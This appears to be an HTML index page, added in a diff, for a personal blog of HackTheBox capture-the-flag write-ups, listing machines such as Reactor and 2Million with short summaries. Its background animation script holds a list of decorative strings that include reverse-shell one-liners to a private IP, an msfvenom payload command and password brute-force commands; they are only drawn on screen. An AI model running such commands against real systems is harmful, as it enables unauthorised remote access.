@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>writeups :: whoami</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        *, 
+        *::before, 
+        *::after { 
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+            font-family: 'Inter', -apple-system, monospace; 
+        }
+        
+        body {
+            background-color: #0a0a0a;
+            min-height: 100vh;
+            color: #e0e0e0;
+        }
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.4;
+        }
+        .content-wrapper {
+            position: relative;
+            z-index: 10;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            background-color: transparent;
+        }
+        .sticky-nav {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            background-color: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 1rem 0;
+            margin-bottom: 2rem;
+        }
+        .nav-link {
+            color: #a0a0a0;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s ease;
+            padding: 0.5rem 1rem;
+            font-size: 1.1rem;
+        }
+        .nav-link:hover {
+            color: #ff3b3b;
+        }
+        .nav-link.active {
+            color: #ff3b3b;
+            font-weight: 600;
+        }
+        .writeup-card {
+            background-color: #141414;
+            padding: 2rem;
+            transition: background-color 0.2s ease;
+        }
+        .writeup-card:hover {
+            background-color: #1c1c1c;
+        }
+        .writeup-card:hover .writeup-title {
+            color: #ff3b3b;
+        }
+        .category-tag {
+            color: #888;
+            font-size: 0.75rem;
+            font-family: monospace;
+            background-color: #1e1e1e;
+            padding: 0.25rem 0.6rem;
+            display: inline-block;
+        }
+        .cursor-blink {
+            display: inline-block;
+            width: 8px;
+            height: 1.2rem;
+            background-color: #ff3b3b;
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .prompt-line {
+            color: #666;
+            font-family: monospace;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+        .prompt-line .red {
+            color: #ff3b3b;
+        }
+        .footer {
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid #1e1e1e;
+            color: #666;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .writeup-meta {
+            color: #888;
+            font-size: 0.85rem;
+            font-family: monospace;
+        }
+        .writeup-meta .dot {
+            color: #ff3b3b;
+        }
+        a.writeup-link {
+            text-decoration: none;
+            color: inherit;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="sticky-nav">
+        <div class="content-wrapper">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-2">
+                    <span class="text-[#ff3b3b] font-mono text-xl">$></span>
+                    <span class="text-white text-xl font-light">./whoami.io</span>
+                </div>
+                
+                <div class="flex items-center gap-2">
+                    <a href="index.html" class="nav-link active">writeups</a>
+                    <a href="ctf.html" class="nav-link">ctf</a>
+                    <a href="research.html" class="nav-link">research</a>
+                    <a href="about.html" class="nav-link">about</a>
+                </div>
+                
+                <div class="text-[#ff3b3b] font-mono text-sm hidden md:block">
+                    [writeups@spectre]
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="content-wrapper">
+        <div class="prompt-line">
+            <span class="red">❯</span> ~/writeups <span class="red">·</span> ls -la
+            <span class="cursor-blink ml-2"></span>
+        </div>
+        <h1 class="text-5xl md:text-7xl font-bold text-white tracking-tight mb-2">
+            writeups<span class="text-[#ff3b3b]">.</span>
+        </h1>
+        <p class="text-[#888] text-lg mb-8 font-mono">// penetration testing reports & ctf solutions</p>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <a href="reactor.html" class="writeup-link">
+                <div class="writeup-card">
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="text-[#ff3b3b] font-mono text-lg">$></span>
+                        <span class="writeup-title text-white text-xl font-semibold transition-colors">Reactor</span>
+                    </div>
+                    <div class="writeup-meta mb-3">
+                        HackTheBox <span class="dot">·</span> Medium <span class="dot">·</span> Ubuntu 24.04
+                    </div>
+                    <p class="text-[#a0a0a0] mb-3 leading-relaxed">Next.js CVE-2025-55182, SQLite credential harvesting, and Node.js inspector privilege escalation to root.</p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="category-tag">ssrf</span>
+                        <span class="category-tag">next.js</span>
+                        <span class="category-tag">web</span>
+                        <span class="category-tag">node.js</span>
+                    </div>
+                </div>
+            </a>
+            <a href="2Million.html" class="writeup-link">
+                <div class="writeup-card">
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="text-[#ff3b3b] font-mono text-lg">$></span>
+                        <span class="writeup-title text-white text-xl font-semibold transition-colors">2Million</span>
+                    </div>
+                    <div class="writeup-meta mb-3">
+                        HackTheBox <span class="dot">·</span> Medium <span class="dot">·</span> Linux
+                    </div>
+                    <p class="text-[#a0a0a0] mb-3 leading-relaxed">Port scanning, manual crawling, API penetration testing, and encryption cracking.</p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="category-tag">api</span>
+                        <span class="category-tag">encryption</span>
+                        <span class="category-tag">web</span>
+                        <span class="category-tag">crawling</span>
+                    </div>
+                </div>
+            </a>
+            <a href="Outbound.html" class="writeup-link">
+                <div class="writeup-card">
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="text-[#ff3b3b] font-mono text-lg">$></span>
+                        <span class="writeup-title text-white text-xl font-semibold transition-colors">Outbound</span>
+                    </div>
+                    <div class="writeup-meta mb-3">
+                        HackTheBox <span class="dot">·</span> Medium <span class="dot">·</span> Linux
+                    </div>
+                    <p class="text-[#a0a0a0] mb-3 leading-relaxed">Reconnaissance, scanning, and exploitation of a HackTheBox machine.</p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="category-tag">recon</span>
+                        <span class="category-tag">exploitation</span>
+                        <span class="category-tag">linux</span>
+                    </div>
+                </div>
+            </a>
+            <a href="Previous.html" class="writeup-link">
+                <div class="writeup-card">
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="text-[#ff3b3b] font-mono text-lg">$></span>
+                        <span class="writeup-title text-white text-xl font-semibold transition-colors">Previous</span>
+                    </div>
+                    <div class="writeup-meta mb-3">
+                        HackTheBox <span class="dot">·</span> Medium <span class="dot">·</span> Linux
+                    </div>
+                    <p class="text-[#a0a0a0] mb-3 leading-relaxed">Full nmap enumeration and exploitation of the Previous HTB machine.</p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="category-tag">nmap</span>
+                        <span class="category-tag">enumeration</span>
+                        <span class="category-tag">linux</span>
+                    </div>
+                </div>
+            </a>
+            <a href="Support.html" class="writeup-link">
+                <div class="writeup-card">
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="text-[#ff3b3b] font-mono text-lg">$></span>
+                        <span class="writeup-title text-white text-xl font-semibold transition-colors">Support</span>
+                    </div>
+                    <div class="writeup-meta mb-3">
+                        HackTheBox <span class="dot">·</span> Easy <span class="dot">·</span> Linux
+                    </div>
+                    <p class="text-[#a0a0a0] mb-3 leading-relaxed">Nmap scanning and enumeration of the Support HTB machine.</p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="category-tag">nmap</span>
+                        <span class="category-tag">enumeration</span>
+                        <span class="category-tag">linux</span>
+                    </div>
+                </div>
+            </a>
+            <a href="Conversor.html" class="writeup-link">
+                <div class="writeup-card">
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="text-[#ff3b3b] font-mono text-lg">$></span>
+                        <span class="writeup-title text-white text-xl font-semibold transition-colors">Conversor</span>
+                    </div>
+                    <div class="writeup-meta mb-3">
+                        HackTheBox <span class="dot">·</span> TBD <span class="dot">·</span> Linux
+                    </div>
+                    <p class="text-[#a0a0a0] mb-3 leading-relaxed">HackTheBox machine walkthrough by Kaizer Baynosa.</p>
+                    <div class="flex flex-wrap gap-2">
+                        <span class="category-tag">htb</span>
+                        <span class="category-tag">walkthrough</span>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="footer">
+            <div class="flex items-center gap-4">
+                <span class="text-[#ff3b3b]">$></span>
+                <span>~/writeups</span>
+            </div>
+            <div class="flex items-center gap-4">
+                <span>pgp fingerprint available</span>
+                <span>·</span>
+                <span>updated 2026-05-30</span>
+            </div>
+        </div>
+    </div>
+    <script>
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        let w, h;
+        function resize() {
+            w = window.innerWidth;
+            h = window.innerHeight;
+            canvas.width = w;
+            canvas.height = h;
+        }
+        resize();
+        window.addEventListener('resize', resize);
+        const phrases = [
+            "bash -i >& /dev/tcp/192.168.1.10/443 0>&1",
+            "nc -e /bin/sh 192.168.1.10 4444",
+            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 1234 >/tmp/f",
+            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('192.168.1.10',443);",
+            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+            "nmap -sS -sV -p- -T4 -A target.com",
+            "nmap --script vuln -p 80,443,445 192.168.1.0/24",
+            "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
+            "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/directory.txt",
+            "sqlmap -u 'http://target.com/page?id=1' --dbs --batch",
+            "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > shell.elf",
+            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com",
+            "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+            "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+            "nc -lvnp 443",
+            "linpeas.sh | tee linpeas_output.txt",
+            "find / -perm -4000 2>/dev/null | xargs ls -la",
+            "ps aux | grep root",
+            "sudo -l",
+            "uname -a && cat /etc/issue && id && hostname",
+            "searchsploit linux kernel 5.4",
+            "crackmapexec smb 192.168.1.0/24",
+            "impacket-psexec administrator:'password'@10.10.10.10",
+            "ssh -i id_rsa user@10.10.10.10",
+            "ssh -L 8080:localhost:80 user@10.10.10.10",
+            "python3 -m http.server 80",
+            "steghide extract -sf image.jpg",
+            "strings file.bin | grep -i flag",
+            "exiftool image.jpg",
+            "gpg --decrypt file.gpg",
+            "privilege escalation",
+            "lateral movement",
+            "foothold obtained",
+            "root access gained",
+            "system compromised",
+            "pwned",
+            "hack the planet",
+            "whoami",
+            "sudo su",
+            "chmod +x exploit",
+            "./exploit",
+            "cat flag.txt",
+            "CTF{...}"
+        ];
+        let particles = [];
+        function initParticles(count = 150) {
+            particles = [];
+            for (let i = 0; i < count; i++) {
+                particles.push({
+                    x: Math.random() * w, y: Math.random() * h,
+                    speedX: (Math.random() - 0.5) * 0.8,
+                    speedY: Math.random() * 0.8 + 0.3,
+                    size: 14 + Math.floor(Math.random() * 20),
+                    opacity: 0.3 + Math.random() * 0.4,
+                    text: phrases[Math.floor(Math.random() * phrases.length)]
+                });
+            }
+        }
+        initParticles(150);
+        function animate() {
+            ctx.clearRect(0, 0, w, h);
+            for (let p of particles) {
+                p.x += p.speedX; p.y += p.speedY;
+                if (p.x > w + 150) p.x = -100; if (p.x < -150) p.x = w + 100;
+                if (p.y > h + 150) p.y = -100; if (p.y < -100) p.y = h + 100;
+                ctx.font = `${p.size}px "Courier New", monospace`;
+                ctx.fillStyle = `rgba(180, 180, 180, ${p.opacity})`;
+                ctx.fillText(p.text, p.x, p.y);
+            }
+            requestAnimationFrame(animate);
+        }
+        animate();
+        window.addEventListener('resize', () => setTimeout(() => initParticles(150), 200));
+    </script>
+</body>
+</html>
